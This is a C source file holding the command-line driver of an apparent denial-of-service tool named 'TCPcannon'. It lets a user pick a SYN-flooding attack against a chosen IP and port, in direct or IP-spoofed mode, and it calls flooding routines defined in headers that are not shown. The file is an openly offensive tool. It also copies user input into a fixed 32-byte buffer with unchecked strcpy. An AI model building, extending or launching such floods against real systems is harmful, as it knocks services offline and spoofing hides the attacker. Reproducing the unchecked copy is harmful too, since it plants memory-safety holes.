
#include "include/SYNflooding.h"
#include "include/benchmarks.h"

void print_help_dialog(const char* arg){
    printf("Usage: %s -S [-m MODE] -d  IP:PORT\n\n", arg);
    printf("Attack configuration\n");
    char* line = "-S";
    char* desc = "Use SYN flooding module";
    printf("\t%-50s %-50s\n\n", line, desc);
    line = "-m direct | spoof | benchmark";
    desc = "Select attack mode within module";
    printf("\t%-50s %-50s\n\n", line, desc);
    line = "-d a.b.c.d:XXXX";
    desc = "Select a target. IP separated by \":\" from port";
    printf("\t%-50s %-50s\n\n", line, desc);
    line = "\nProgram options";
    printf("\t%-50s\n", line);
    line = "-h";
    desc = "Print this help";
    printf("\t%-50s %-50s\n\n", line, desc);

}



int main(int argc, char *argv[]){
    int opt;
    enum { SEL_MODULE, SYN_MODE } module = SEL_MODULE;
    enum { SEL_MODE, DIRECT, SPOOFED, BENCHMARK} mode = SEL_MODE;
    //TODO int silent = 0;
    const char delimitor[2] = ":";
    char* token;
    //TODO char source_address[32];
    //TODO uint16_t source_port;
    char dest_address[32];
    uint16_t dest_port = 0;
    //TODO char* payload = malloc(sizeof(char)*200);
    int target_selected = 0;

    //Command line argument parsing
    while ((opt = getopt(argc, argv, ":Sm:d:h")) != -1) {
        switch (opt) {
        case 'S':
            //Attack module 
            printf("Option S detected\n");
            module = SYN_MODE; 
            break;
        case 'm': 
            //Mode within module
            printf("Option m has argument %s\n", optarg);
            if(strcmp(optarg, "spoof")==0) mode = SPOOFED;
            else if(strcmp(optarg, "benchmark")==0) mode = BENCHMARK;
            else if(strcmp(optarg, "direct")==0) mode = DIRECT;
            else{
                fprintf(stderr, "Unrecognized mode \"%s\"\n", optarg); exit(EXIT_FAILURE);
            } 
            break;
        /*case 'q':     TODO
            //Quiet mode
            printf("Option q detected\n");
            silent = 1; 
            break;*/
        /*case 's':     TODO
            //Source
            printf("Option s has argument %s\n", optarg);
            token = strtok(optarg, delimitor);
            strcpy(source_address, token);
            if(token != NULL) {                
                token = strtok(NULL, delimitor);
                source_port = atoi(token);
            }
            if(source_port == 0){
                fprintf(stderr, "Invalid source port in parameter %s\n", optarg);
                exit(EXIT_FAILURE);
            }
            if(strcmp(source_address, "")==0){
                fprintf(stderr, "Invalid source IP in parameter %s\n", optarg);
                exit(EXIT_FAILURE);
            }

            printf("Source port %i, source address %s\n", source_port, source_address);
            break;*/
        case 'd':
            //Destination
            printf("Option d has argument %s\n", optarg);
            token = strtok(optarg, delimitor);
            strcpy(dest_address, token);
            if(token != NULL) {                
                token = strtok(NULL, delimitor);
                dest_port = atoi(token);
            }
            if(dest_port == 0){
                fprintf(stderr, "Invalid destination port in parameter %s\n", optarg);
                exit(EXIT_FAILURE);
            }
            if(strcmp(dest_address, "")==0){
                fprintf(stderr, "Invalid destination IP in parameter %s\n", optarg);
                exit(EXIT_FAILURE);
            }
            target_selected = 1;
            printf("Destination port %i, destination address %s\n", dest_port, dest_address);
            break;
        /*case 'p': TODO
            //Payload
            printf("Option s has argument %s\n", optarg);
            strcpy(payload, optarg);
            break;*/
        case 'h':
            print_help_dialog(argv[0]);
            exit(0);
            break;
        case '?':
            printf("Unknown option: %c\n", optopt);
            break;
        case ':':
            printf("Missing arguments for %c\n", optopt);
            exit(EXIT_FAILURE);
            break;
        
        default:
            fprintf(stderr, "Usage: %s -S [-m MODE] -d  IP:PORT\n\n", argv[0]);
            exit(EXIT_FAILURE);
        }
    }
    
    //printf("MODULE: %s, MODE: %s, silent=%i, Source: %s:%i, Destination: %s:%i, Payload: %s\n", 
    //    module, mode, silent, source_address, source_port, dest_address, dest_port, payload); 

    //Checking mandatory arguments:
    if(module == SEL_MODULE){
        fprintf(stderr, "Please select an attack module first\n\"TCPcannon -h\" for instructions.\n");
        exit(EXIT_FAILURE);
    } 
    if(mode == SEL_MODE){
        fprintf(stderr, "Please select an attack mode first with -m\n");
        exit(EXIT_FAILURE);
    }
    if(target_selected == 0){
        fprintf(stderr, "Please select a target with -d\n");
        exit(EXIT_FAILURE);
    }

    //Selecting module and mode
    if(module == SYN_MODE){
        printf("INFO: Attack module selected: SYN flooding\n");

        if(mode == DIRECT){
            printf("INFO: Mode: direct (no spoofing)\n");
            printf("INFO: From <your IP>:8080 to %s:8080    (Attacking the port of your choice is not yet available)\n", dest_address);
            sleep(2);
            syn_flooding_direct(dest_address);
        }
        else if(mode == SPOOFED){
            printf("INFO: Mode: spoofed (random IP source)\n");
            printf("INFO: The source IP will change after each packet sent\n");
            printf("INFO: From <random IP>:8080 to %s:8080    (Attacking the port of your choice is not yet available)\n", dest_address);
            sleep(2);
            syn_flooding_spoofed(dest_address);
        }else if(mode == BENCHMARK){
            printf("INFO: Mode: Benchmark\n");
            printf("INFO: This is a benchmark for the spoofed mode. It will take 1 minute.\n");
            printf("INFO: From <random IP>:8080 to %s:8080    (Attacking the port of your choice is not yet available)\n", dest_address);
            sleep(2);
            benchmark_syn_flooding_spoofed(dest_address);
        }

    }

    return 0;
}